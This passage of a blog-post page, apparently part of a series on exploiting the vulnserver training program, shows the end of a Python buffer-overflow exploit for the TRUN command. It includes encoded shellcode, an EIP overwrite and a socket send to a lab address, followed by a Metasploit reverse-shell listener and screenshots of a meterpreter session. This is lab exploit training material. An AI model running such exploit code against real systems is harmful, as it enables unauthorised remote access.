+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\x3d\x82\x08\xdf\x38\xf6\xa5\xc8\xc6\x04\x08\xce\x31</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\xe9\x7c\xff\x0a\x74\xf1\x32\x74\x2d\x7c\xed\x51\x82</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\x51\x2d\x08\xda\x6f\x82\x05\x42\x82\x51\x15\x08\xda</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\x82\x0d\x82\x08\xd9\x80\x4d\x2d\x2d\x52\x52\x68\x50</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\x53\x58\xf6\xe9\x56\x56\x53\x82\x1b\xe2\x84\x54\x61</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\x3a\x3b\x09\x09\x61\x7e\x7a\x3b\x56\x5d\x61\x45\x7e</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\x2f\x0e\x80\xe1\xf6\xd9\xb1\x99\x08\x09\x09\x20\xcd</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\x5d\x59\x61\x20\x89\x62\x09\xf6\xdc\x63\x03\x61\xc9</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\xa1\xb0\x98\x61\x0b\x09\x18\x55\x80\xef\x59\x59\x59</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\x59\x49\x59\x49\x59\x61\xe3\x06\xd6\xe9\xf6\xdc\x9e</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\x63\x19\x5f\x5e\x61\x90\xac\x7d\x68\xf6\xdc\x8c\xc9</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\x7d\x03\xf6\x47\x01\x7c\xe5\xe1\x6e\x09\x09\x09\x63</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\x09\x63\x0d\x5f\x5e\x61\x0b\xd0\xc1\x56\xf6\xdc\x8a</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\xf1\x09\x77\x3f\x82\x3f\x63\x49\x61\x09\x19\x09\x09</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\x5f\x63\x09\x61\x51\xad\x5a\xec\xf6\xdc\x9a\x5a\x63</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\x09\x5f\x5a\x5e\x61\x0b\xd0\xc1\x56\xf6\xdc\x8a\xf1</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\x09\x74\x21\x51\x61\x09\x49\x09\x09\x63\x09\x59\x61</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\x02\x26\x06\x39\xf6\xdc\x5e\x61\x7c\x67\x44\x68\xf6</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\xdc\x57\x57\xf6\x05\x2d\x06\x8c\x79\xf6\xf6\xf6\xe0</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\x92\xf6\xf6\xf6\x08\xca\x20\xcf\x7c\xc8\xca\xb2\xe9</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\x14\x23\x03\x61\xaf\x9c\xb4\x94\xf6\xdc\x35\x0f\x75</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\x03\x89\xf2\xe9\x7c\x0c\xb2\x4e\x1a\x7b\x66\x63\x09</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\x5a\xf6\xdc\x40\xc0</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">buffer</span> <span class="o">=</span> <span class="n">pre_padding</span> <span class="o">+</span> <span class="n">eip</span> <span class="o">+</span> <span class="n">shellcode</span>
+</span></span><span class="line"><span class="cl"><span class="n">command</span> <span class="o">=</span> <span class="s1">&#39;TRUN .&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="n">command</span> <span class="o">+</span> <span class="n">buffer</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span> <span class="s1">&#39;[*] Sending data: &#39;</span> <span class="o">+</span> <span class="n">data</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">create_connection</span><span class="p">((</span><span class="s1">&#39;192.168.185.146&#39;</span><span class="p">,</span><span class="mi">9999</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span></code></pre></div><p>Time to send the final payload, make sure you start the <strong>metasploit listener</strong>. I used the <code>exploit/multi/handler</code> and the appropriate payload: <code>windows/meterpreter/reverse_tcp</code>.</p>
+<p>Sending the final exploit:</p>
+<img src="https://dunderhay.github.io/images/vulnserver/trun/trun-send-shellcode.png" alt="trun-send-shellcode" width="700"/>
+<p>Getting a meterpreter shell from the victim:</p>
+<img src="https://dunderhay.github.io/images/vulnserver/trun/trun-metasploit-listener.png" alt="trun-metasploit-listener" width="700"/>
+
+      </div>
+      <script>
+
+        var liked_article = false
+
+        if (typeof auth !== 'undefined') {
+          var oid = "views_posts\/vulnserver\/trun.md"
+          var id = oid ? oid.replaceAll("/", "-") : oid
+
+          var viewed = localStorage.getItem(id);
+
+          if (!viewed) {
+            auth.signInAnonymously()
+              .then(() => {
+                var docRef = db.collection('views').doc(id)
+                localStorage.setItem(id, true);
+                docRef.get().then((doc) => {
+                  if (doc.exists) {
+                    db.collection('views').doc(id).update({
+                      views: firebase.firestore.FieldValue.increment(1)
+                    });
+                  } else {
+                    db.collection('views').doc(id).set({ views: 1 })
+                  }
+                }).catch((error) => {
+                  console.log("Error getting document:", error);
+                });
+              })
+              .catch((error) => {
+                var errorCode = error.code;
+                var errorMessage = error.message;
+                console.error(errorCode, errorMessage)
+              });
+          }
+
+          var oid_likes = "likes_posts\/vulnserver\/trun.md"
+          var id_likes = oid_likes ? oid_likes.replaceAll("/", "-") : oid_likes
+
+          var liked = localStorage.getItem(id_likes);
+
+          if (liked) {
+            liked_article = true
+            document.querySelectorAll("span[id='likes_button_heart']")[0].style.display = ""
+            document.querySelectorAll("span[id='likes_button_emtpty_heart']")[0].style.display = "none"
+            document.querySelectorAll("span[id='likes_button_text']")[0].innerText = ""
+          }
+
+        }
+
+        function like_article(id_likes) {
+          auth.signInAnonymously()
+            .then(() => {
+              var docRef = db.collection('likes').doc(id_likes)
+              docRef.get().then((doc) => {
+                liked_article = true
+                localStorage.setItem(id_likes, true);
+                document.querySelectorAll("span[id='likes_button_heart']")[0].style.display = ""
+                document.querySelectorAll("span[id='likes_button_emtpty_heart']")[0].style.display = "none"
+                document.querySelectorAll("span[id='likes_button_text']")[0].innerText = ""
+                if (doc.exists) {
+                  db.collection('likes').doc(id_likes).update({
+                    likes: firebase.firestore.FieldValue.increment(1)
+                  });
+                } else {
+                  db.collection('likes').doc(id_likes).set({ likes: 1 })
+                }
+              }).catch((error) => {
+                console.log("Error getting document:", error);
+              });
+            })
+            .catch((error) => {
+              var errorCode = error.code;
+              var errorMessage = error.message;
+              console.error(errorCode, errorMessage)
+            });
+        }
+
+        function remove_like_article(id_likes) {
+          auth.signInAnonymously()
+            .then(() => {
+              var docRef = db.collection('likes').doc(id_likes)
+              docRef.get().then((doc) => {
+                liked_article = false
+                localStorage.removeItem(id_likes);
+                document.querySelectorAll("span[id='likes_button_heart']")[0].style.display = "none"
+                document.querySelectorAll("span[id='likes_button_emtpty_heart']")[0].style.display = ""
+                document.querySelectorAll("span[id='likes_button_text']")[0].innerText = "\xa0Like"
+                if (doc.exists) {
+                  db.collection('likes').doc(id_likes).update({
+                    likes: firebase.firestore.FieldValue.increment(-1)
+                  });
+                } else {
+                  db.collection('likes').doc(id_likes).set({ likes: 0 })
+                }
+              }).catch((error) => {
+                console.log("Error getting document:", error);
+              });
+            })
+            .catch((error) => {
+              var errorCode = error.code;
+              var errorMessage = error.message;
+              console.error(errorCode, errorMessage)
+            });
+        }
+
+        function process_article() {
+          var oid_likes = "likes_posts\/vulnserver\/trun.md"
+          var id_likes = oid_likes ? oid_likes.replaceAll("/", "-") : oid_likes
+          if (!liked_article) {
+            like_article(id_likes)
+          } else {
+            remove_like_article(id_likes)
+          }
+        }
+
+        var header = document.getElementById("single_header")
+        var style = getComputedStyle(header);
+        var margin = '-'+ (parseInt(style.height) + parseInt(style.marginTop) + parseInt(style.marginBottom) + 20) + 'px'
+        var hero = document.getElementById('hero')
+        if(hero)
+          hero.style["margin-bottom"] = margin;
+      </script>
+  </section>
+  <footer class="pt-8 max-w-prose print:hidden">
+
+    
+  <div class="flex">
+    
+      
+      
+        
+        <img
+          class="!mt-0 !mb-0 h-24 w-24 rounded-full ltr:mr-4 rtl:ml-4"
+          width="96"
+          height="96"
+          alt="Daniel Underhay"
+          src="https://dunderhay.github.io/img/me_hue3ce00307929f4e4c18a3d359a467ebd_17776_192x192_fill_q75_box_smart1.jpeg"
+        />
+      
+    
+    <div class="place-self-center">
+      
+        <div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">
+          Author
+        </div>
+        <div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">
+          Daniel Underhay
+        </div>
+      
+      
+        <div class="text-sm text-neutral-700 dark:text-neutral-400">👋</div>
+      
+      <div class="text-2xl sm:text-lg">
+  <div class="flex flex-wrap text-neutral-400 dark:text-neutral-500">
+    
+      
+        <a
+          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
+          href="https://github.com/dunderhay/"
+          target="_blank"
+          aria-label="Github"
+          rel="me noopener noreferrer"
+          >
+
+  <span class="relative inline-block align-text-bottom icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+
+  </span>
+
+</a
+        >
+      
+    
+      
+        <a
+          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
+          href="https://au.linkedin.com/in/daniel-underhay"
+          target="_blank"
+          aria-label="Linkedin"
+          rel="me noopener noreferrer"
+          >
+
+  <span class="relative inline-block align-text-bottom icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
+
+  </span>
+
+</a
+        >
+      
+    
+      
+        <a
+          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
+          href="https://twitter.com/dunderhay"
+          target="_blank"
+          aria-label="Twitter"
+          rel="me noopener noreferrer"
+          >
+
+  <span class="relative inline-block align-text-bottom icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg>
+
+  </span>
+
+</a
+        >
+      
+    
+  </div>
+
+</div>
+    </div>
+  </div>
+
+
+
+    
+    
+    
+    
+
+    
+  
+  <section class="flex flex-row flex-wrap justify-center pt-4 text-xl">
+    
+      
+        <a
+          class="m-1 inline-block min-w-[2.4rem] rounded bg-neutral-300 p-1 text-center text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+          href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://dunderhay.github.io/posts/vulnserver/trun/&amp;title=Exploiting%20vulnserver:%20trun"
+          title="Share on LinkedIn"
+          aria-label="Share on LinkedIn"
+          >
+
+  <span class="relative inline-block align-text-bottom icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
+
+  </span>
+
+</a
+        >
+      
+    
+      
+        <a
+          class="m-1 inline-block min-w-[2.4rem] rounded bg-neutral-300 p-1 text-center text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+          href="https://twitter.com/intent/tweet/?url=https://dunderhay.github.io/posts/vulnserver/trun/&amp;text=Exploiting%20vulnserver:%20trun"
+          title="Tweet on Twitter"
+          aria-label="Tweet on Twitter"
+          >
+
+  <span class="relative inline-block align-text-bottom icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg>
+
+  </span>
+
+</a
+        >
+      
+    
+      
+    
+      
+        <a
+          class="m-1 inline-block min-w-[2.4rem] rounded bg-neutral-300 p-1 text-center text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+          href="https://pinterest.com/pin/create/bookmarklet/?url=https://dunderhay.github.io/posts/vulnserver/trun/&amp;description=Exploiting%20vulnserver:%20trun"
+          title="Pin on Pinterest"
+          aria-label="Pin on Pinterest"
+          >
+
+  <span class="relative inline-block align-text-bottom icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M496 256c0 137-111 248-248 248-25.6 0-50.2-3.9-73.4-11.1 10.1-16.5 25.2-43.5 30.8-65 3-11.6 15.4-59 15.4-59 8.1 15.4 31.7 28.5 56.8 28.5 74.8 0 128.7-68.8 128.7-154.3 0-81.9-66.9-143.2-152.9-143.2-107 0-163.9 71.8-163.9 150.1 0 36.4 19.4 81.7 50.3 96.1 4.7 2.2 7.2 1.2 8.3-3.3.8-3.4 5-20.3 6.9-28.1.6-2.5.3-4.7-1.7-7.1-10.1-12.5-18.3-35.3-18.3-56.6 0-54.7 41.4-107.6 112-107.6 60.9 0 103.6 41.5 103.6 100.9 0 67.1-33.9 113.6-78 113.6-24.3 0-42.6-20.1-36.7-44.8 7-29.5 20.5-61.3 20.5-82.6 0-19-10.2-34.9-31.4-34.9-24.9 0-44.9 25.7-44.9 60.2 0 22 7.4 36.8 7.4 36.8s-24.5 103.8-29 123.2c-5 21.4-3 51.6-.9 71.2C65.4 450.9 0 361.1 0 256 0 119 111 8 248 8s248 111 248 248z"/></svg>
+
+  </span>
+
+</a
+        >
+      
+    
+      
+        <a
+          class="m-1 inline-block min-w-[2.4rem] rounded bg-neutral-300 p-1 text-center text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+          href="https://reddit.com/submit/?url=https://dunderhay.github.io/posts/vulnserver/trun/&amp;resubmit=true&amp;title=Exploiting%20vulnserver:%20trun"
+          title="Submit to Reddit"
+          aria-label="Submit to Reddit"
+          >
+
+  <span class="relative inline-block align-text-bottom icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M201.5 305.5c-13.8 0-24.9-11.1-24.9-24.6 0-13.8 11.1-24.9 24.9-24.9 13.6 0 24.6 11.1 24.6 24.9 0 13.6-11.1 24.6-24.6 24.6zM504 256c0 137-111 248-248 248S8 393 8 256 119 8 256 8s248 111 248 248zm-132.3-41.2c-9.4 0-17.7 3.9-23.8 10-22.4-15.5-52.6-25.5-86.1-26.6l17.4-78.3 55.4 12.5c0 13.6 11.1 24.6 24.6 24.6 13.8 0 24.9-11.3 24.9-24.9s-11.1-24.9-24.9-24.9c-9.7 0-18 5.8-22.1 13.8l-61.2-13.6c-3-.8-6.1 1.4-6.9 4.4l-19.1 86.4c-33.2 1.4-63.1 11.3-85.5 26.8-6.1-6.4-14.7-10.2-24.1-10.2-34.9 0-46.3 46.9-14.4 62.8-1.1 5-1.7 10.2-1.7 15.5 0 52.6 59.2 95.2 132 95.2 73.1 0 132.3-42.6 132.3-95.2 0-5.3-.6-10.8-1.9-15.8 31.3-16 19.8-62.5-14.9-62.5zM302.8 331c-18.2 18.2-76.1 17.9-93.6 0-2.2-2.2-6.1-2.2-8.3 0-2.5 2.5-2.5 6.4 0 8.6 22.8 22.8 87.3 22.8 110.2 0 2.5-2.2 2.5-6.1 0-8.6-2.2-2.2-6.1-2.2-8.3 0zm7.7-75c-13.6 0-24.6 11.1-24.6 24.9 0 13.6 11.1 24.6 24.6 24.6 13.8 0 24.9-11.1 24.9-24.6 0-13.8-11-24.9-24.9-24.9z"/></svg>
+
+  </span>
+
+</a
+        >
+      
+    
+      
+        <a
+          class="m-1 inline-block min-w-[2.4rem] rounded bg-neutral-300 p-1 text-center text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+          href="https://www.facebook.com/sharer/sharer.php?u=https://dunderhay.github.io/posts/vulnserver/trun/&amp;quote=Exploiting%20vulnserver:%20trun"
+          title="Share on Facebook"
+          aria-label="Share on Facebook"
+          >
+
+  <span class="relative inline-block align-text-bottom icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M504 256C504 119 393 8 256 8S8 119 8 256c0 123.78 90.69 226.38 209.25 245V327.69h-63V256h63v-54.64c0-62.15 37-96.48 93.67-96.48 27.14 0 55.52 4.84 55.52 4.84v61h-31.28c-30.8 0-40.41 19.12-40.41 38.73V256h68.78l-11 71.69h-57.78V501C413.31 482.38 504 379.78 504 256z"/></svg>
+
+  </span>
+
+</a
+        >
+      
+    
+      
+        <a
+          class="m-1 inline-block min-w-[2.4rem] rounded bg-neutral-300 p-1 text-center text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+          href="mailto:?body=https://dunderhay.github.io/posts/vulnserver/trun/&amp;subject=Exploiting%20vulnserver:%20trun"
+          title="Send via email"
+          aria-label="Send via email"
+          >
+
+  <span class="relative inline-block align-text-bottom icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M207.8 20.73c-93.45 18.32-168.7 93.66-187 187.1c-27.64 140.9 68.65 266.2 199.1 285.1c19.01 2.888 36.17-12.26 36.17-31.49l.0001-.6631c0-15.74-11.44-28.88-26.84-31.24c-84.35-12.98-149.2-86.13-149.2-174.2c0-102.9 88.61-185.5 193.4-175.4c91.54 8.869 158.6 91.25 158.6 183.2l0 16.16c0 22.09-17.94 40.05-40 40.05s-40.01-17.96-40.01-40.05v-120.1c0-8.847-7.161-16.02-16.01-16.02l-31.98 .0036c-7.299 0-13.2 4.992-15.12 11.68c-24.85-12.15-54.24-16.38-86.06-5.106c-38.75 13.73-68.12 48.91-73.72 89.64c-9.483 69.01 43.81 128 110.9 128c26.44 0 50.43-9.544 69.59-24.88c24 31.3 65.23 48.69 109.4 37.49C465.2 369.3 496 324.1 495.1 277.2V256.3C495.1 107.1 361.2-9.332 207.8 20.73zM239.1 304.3c-26.47 0-48-21.56-48-48.05s21.53-48.05 48-48.05s48 21.56 48 48.05S266.5 304.3 239.1 304.3z"/></svg>
+
+  </span>
+
+</a
+        >
+      
+    
+  </section>
+
+
+    
+  
+    
+    
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
+      <div class="flex justify-between pt-3">
+        <span>
+          
+            <a class="flex group" href="https://dunderhay.github.io/posts/vulnserver/intro/">
+              <span
+                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
+                >&larr;</span
+              >
+              <span
+                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
+                >&rarr;</span
+              >
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >Exploiting vulnserver: Intro</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                </span>
+              </span>
+            </a>
+          
+        </span>
+        <span>
+          
+            <a class="flex text-right group" href="https://dunderhay.github.io/posts/vulnserver/gmon/">
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >Exploiting vulnserver: gmon</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                </span>
+              </span>
+              <span
+                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
+                >&rarr;</span
+              >
+              <span
+                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
+                >&larr;</span
+              >
+            </a>
+          
+        </span>
+      </div>
+    </div>
+  
+
+
+    
+  </footer>
+</article>
+
+        
+          <div
+            class="pointer-events-none absolute top-[100vh] bottom-0 w-12 ltr:right-0 rtl:left-0"
+          >
+            <a
+              href="#the-top"
+              class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 backdrop-blur hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+              aria-label="Scroll to top"
+              title="Scroll to top"
+            >
+              &uarr;
+            </a>
+          </div>
+        
+      </main><footer class="py-10 print:hidden">
+  
+  
+  <nav class="pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400">
+    <ul class="flex flex-col list-none sm:flex-row">
+      
+      <li class="mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0">
+        <a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2" href=""
+          title=""></a>
+      </li>
+      
+    </ul>
+  </nav>
+  
+  <div class="flex items-center justify-between">
+
+    
+    
+
+    
+    
+
+  </div>
+  <script>
+    mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
+      margin: 24,
+      background: 'rgba(0,0,0,0.5)',
+      scrollOffset: 0,
+    })
+  </script>
+  
+  
